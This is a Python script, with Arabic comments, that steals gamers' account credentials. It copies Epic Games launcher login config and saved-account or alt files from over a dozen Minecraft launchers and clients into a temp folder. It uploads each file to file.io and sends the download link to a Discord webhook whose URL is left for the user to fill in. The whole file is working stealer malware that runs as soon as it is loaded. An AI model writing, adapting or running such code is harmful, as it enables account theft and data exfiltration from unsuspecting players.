import os
import shutil
import requests

# تعيين مسار الحفظ
temp_path = os.getenv("TEMP")  # يمكنك تغيير هذا إلى مسار مخصص إذا أردت

class Games:
    def __init__(self):
        print("Starting the process...")
        self.grabEpic()
        self.grabMinecraft()

    def GetLnkFromStartMenu(self, app: str) -> list[str]:
        shortcutPaths = []
        startMenuPaths = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
            os.path.join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs")
        ]
        for startMenuPath in startMenuPaths:
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == "%s.lnk" % app.lower():
                        shortcutPaths.append(os.path.join(root, file))       
        return shortcutPaths

    def grabEpic(self) -> None:
        print("Grabbing Epic Games data...")
        saveToPath = os.path.join(temp_path, "Games", "Epic")
        epicPath = os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows")
        if os.path.isdir(epicPath):
            loginFile = os.path.join(epicPath, "GameUserSettings.ini")
            if os.path.isfile(loginFile):
                with open(loginFile) as file:
                    contents = file.read()
                if "[RememberMe]" in contents:
                    try:
                        os.makedirs(saveToPath, exist_ok=True)
                        for file in os.listdir(epicPath):
                            file_path = os.path.join(epicPath, file)
                            if os.path.isfile(file_path):
                                print(f"Copying file: {file}")
                                shutil.copy(file_path, os.path.join(saveToPath, file))
                        shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                        print("Epic Games data copied successfully.")
                        # رفع الملفات إلى file.io
                        self.upload_to_fileio(saveToPath)
                    except Exception as e:
                        print(f"Error copying Epic Games data: {e}")
        else:
            print("Epic Games folder not found.")

    def grabMinecraft(self) -> None:
        print("Grabbing Minecraft data...")
        saveToPath = os.path.join(temp_path, "Games", "Minecraft")
        userProfile = os.getenv("userprofile")
        roaming = os.getenv("appdata")
        minecraftPaths = {
             "Intent" : os.path.join(userProfile, "intentlauncher", "launcherconfig"),
             "Lunar" : os.path.join(userProfile, ".lunarclient", "settings", "game", "accounts.json"),
             "TLauncher" : os.path.join(roaming, ".minecraft", "TlauncherProfiles.json"),
             "Feather" : os.path.join(roaming, ".feather", "accounts.json"),
             "Meteor" : os.path.join(roaming, ".minecraft", "meteor-client", "accounts.nbt"),
             "Impact" : os.path.join(roaming, ".minecraft", "Impact", "alts.json"),
             "Novoline" : os.path.join(roaming, ".minectaft", "Novoline", "alts.novo"),
             "CheatBreakers" : os.path.join(roaming, ".minecraft", "cheatbreaker_accounts.json"),
             "Microsoft Store" : os.path.join(roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
             "Rise" : os.path.join(roaming, ".minecraft", "Rise", "alts.txt"),
             "Rise (Intent)" : os.path.join(userProfile, "intentlauncher", "Rise", "alts.txt"),
             "Paladium" : os.path.join(roaming, "paladium-group", "accounts.json"),
             "PolyMC" : os.path.join(roaming, "PolyMC", "accounts.json"),
             "Badlion" : os.path.join(roaming, "Badlion Client", "accounts.json"),
        }

        for name, path in minecraftPaths.items():
            if os.path.isfile(path):
                try:
                    os.makedirs(os.path.join(saveToPath, name), exist_ok=True)
                    shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                    print(f"{name} data copied successfully.")
                    # رفع الملفات إلى file.io
                    self.upload_to_fileio(saveToPath)
                except Exception as e:
                    print(f"Error copying {name} data: {e}")
            else:
                print(f"File for {name} not found: {path}")

    def upload_to_fileio(self, folder_path):
        print(f"Uploading files from {folder_path} to file.io...")
        url = "https://file.io"
        
        # رفع جميع الملفات داخل المجلد إلى file.io
        for file_name in os.listdir(folder_path):
            file_path = os.path.join(folder_path, file_name)
            if os.path.isfile(file_path):
                print(f"Uploading {file_name}...")
                with open(file_path, 'rb') as file:
                    response = requests.post(url, files={'file': file})
                    data = response.json()
                    if response.status_code == 200 and 'link' in data:
                        file_url = data['link']
                        print(f"File uploaded: {file_url}")
                        # إرسال الرابط إلى Discord Webhook
                        self.send_to_discord(file_url)

    def send_to_discord(self, file_url):
        webhook_url = 'WEBHOOKS_URL'  # استبدل برابط Webhook الخاص بك

        data = {
            "content": f"تم رفع الملف بنجاح! الرابط: {file_url}"
        }

        response = requests.post(webhook_url, json=data)
        
        if response.status_code == 204:
            print("تم إرسال الرابط بنجاح إلى Discord.")
        else:
            print(f"فشل في إرسال الرابط إلى Discord. حالة الاستجابة: {response.status_code}")

# إنشاء كائن من الفئة لتنفيذ العملية
games = Games()
